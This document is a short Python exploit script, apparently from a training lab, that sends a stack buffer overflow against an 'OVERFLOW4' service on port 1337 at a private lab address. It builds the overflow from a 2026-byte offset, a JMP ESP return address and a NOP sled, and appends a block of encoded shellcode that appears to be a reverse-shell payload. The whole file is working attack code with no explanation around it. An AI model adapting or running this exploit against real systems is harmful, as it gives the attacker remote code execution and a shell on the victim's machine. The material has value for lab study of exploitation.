#!/usr/bin/env python3

import socket

ip = "10.10.67.242"
port = 1337

prefix = "OVERFLOW4 "
offset = 2026
overflow = "A" * offset
# 625011AF
retn = "\xAF\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xb8\xb6\x65\x28\x80\xdb\xc7\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x31\x45\x12\x03\x45\x12\x83\x73\x61\xca\x75\x87\x82\x88"
"\x76\x77\x53\xed\xff\x92\x62\x2d\x9b\xd7\xd5\x9d\xef\xb5\xd9"
"\x56\xbd\x2d\x69\x1a\x6a\x42\xda\x91\x4c\x6d\xdb\x8a\xad\xec"
"\x5f\xd1\xe1\xce\x5e\x1a\xf4\x0f\xa6\x47\xf5\x5d\x7f\x03\xa8"
"\x71\xf4\x59\x71\xfa\x46\x4f\xf1\x1f\x1e\x6e\xd0\x8e\x14\x29"
"\xf2\x31\xf8\x41\xbb\x29\x1d\x6f\x75\xc2\xd5\x1b\x84\x02\x24"
"\xe3\x2b\x6b\x88\x16\x35\xac\x2f\xc9\x40\xc4\x53\x74\x53\x13"
"\x29\xa2\xd6\x87\x89\x21\x40\x63\x2b\xe5\x17\xe0\x27\x42\x53"
"\xae\x2b\x55\xb0\xc5\x50\xde\x37\x09\xd1\xa4\x13\x8d\xb9\x7f"
"\x3d\x94\x67\xd1\x42\xc6\xc7\x8e\xe6\x8d\xea\xdb\x9a\xcc\x62"
"\x2f\x97\xee\x72\x27\xa0\x9d\x40\xe8\x1a\x09\xe9\x61\x85\xce"
"\x0e\x58\x71\x40\xf1\x63\x82\x49\x36\x37\xd2\xe1\x9f\x38\xb9"
"\xf1\x20\xed\x6e\xa1\x8e\x5e\xcf\x11\x6f\x0f\xa7\x7b\x60\x70"
"\xd7\x84\xaa\x19\x72\x7f\x3d\x2c\x8e\x66\x4f\x58\x92\x98\xbe"
"\xc5\x1b\x7e\xaa\xe5\x4d\x29\x43\x9f\xd7\xa1\xf2\x60\xc2\xcc"
"\x35\xea\xe1\x31\xfb\x1b\x8f\x21\x6c\xec\xda\x1b\x3b\xf3\xf0"
"\x33\xa7\x66\x9f\xc3\xae\x9a\x08\x94\xe7\x6d\x41\x70\x1a\xd7"
"\xfb\x66\xe7\x81\xc4\x22\x3c\x72\xca\xab\xb1\xce\xe8\xbb\x0f"
"\xce\xb4\xef\xdf\x99\x62\x59\xa6\x73\xc5\x33\x70\x2f\x8f\xd3"
"\x05\x03\x10\xa5\x09\x4e\xe6\x49\xbb\x27\xbf\x76\x74\xa0\x37"
"\x0f\x68\x50\xb7\xda\x28\x70\x5a\xce\x44\x19\xc3\x9b\xe4\x44"
"\xf4\x76\x2a\x71\x77\x72\xd3\x86\x67\xf7\xd6\xc3\x2f\xe4\xaa"
"\x5c\xda\x0a\x18\x5c\xcf")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")